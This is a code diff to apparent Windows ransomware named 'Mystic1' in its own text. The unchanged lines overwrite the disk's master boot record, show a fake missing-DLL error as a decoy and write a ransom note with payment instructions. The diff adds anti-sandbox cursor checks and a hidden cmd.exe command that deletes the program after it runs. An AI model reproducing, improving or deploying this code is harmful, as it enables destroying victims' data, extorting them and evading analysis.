@@ -65,7 +65,7 @@ int main() {
                 HANDLE disk = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
                 WriteFile(disk, data, 512, &WrittenBytes, NULL);
                 CloseHandle(disk);
-                ExitWindowsEx(EWX_SHUTDOWN, 0);
+                ExitWindowsEx(EWX_REBOOT, 0);
                 return 0;
             }
         }
@@ -81,13 +81,19 @@ int main() {
 
     int Time = 60000, Divider = rand() % 10000 + 100, DividedSleep = Time / Divider;
 
+    LPPOINT Pos1, Pos2;
+
+    GetCursorPos(Pos1);
+
     for (int j = 0; j <= Divider; j++) {
         Sleep(DividedSleep);
     }
 
     DWORD PatchCheck = GetTickCount();
 
-    if ((int)(PatchCheck - Tick1) < Time - 5000 || IsDebuggerPresent()) {
+    GetCursorPos(Pos2);
+
+    if ((int)(PatchCheck - Tick1) < Time - 5000 || Pos1 == Pos2 || IsDebuggerPresent()) {
         MessageBoxA(NULL, "Attempted tampering detected... Sending IP address to Blacklist server.", NULL, MB_ICONERROR && MB_OK);
         char PathToSelf[MAX_PATH];
         GetModuleFileNameA(NULL, PathToSelf, MAX_PATH);
@@ -100,6 +106,7 @@ int main() {
     }
 
 #endif
+
 
     MessageBoxA(NULL, "The program can't start because XINPUT1_3.dll is missing from your computer. Try reinstalling the program to fix this problem or contact the system administrator.", NULL, MB_ICONERROR);
     HANDLE MyFile = CreateFileA(DestinationFile, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -129,6 +136,15 @@ int main() {
     fprintf(OUTPUT_FILE, "%s", PaymentInstructions);
     fprintf(OUTPUT_FILE, "%s", "\nEnjoy a nice continuation of your usual little computer tasks... :3 \n\n --with love, the Mystic1 developer.");
     fclose(OUTPUT_FILE);
+    Sleep(500);
+    char PathToSelf[MAX_PATH];
+    GetModuleFileNameA(NULL, PathToSelf, MAX_PATH);
+    std::string Command = "/C ping 1.1.1.1 - n 1 - w 3000 > Nul & Del /f /q \"";
+    Command += PathToSelf;
+    Command += "\"";
+    ShellExecuteA(0, "open", "cmd.exe", Command.c_str(), 0, SW_HIDE);
+    exit(1);
+
 }
 
 bool find(const std::string& myString, const std::string& subString)
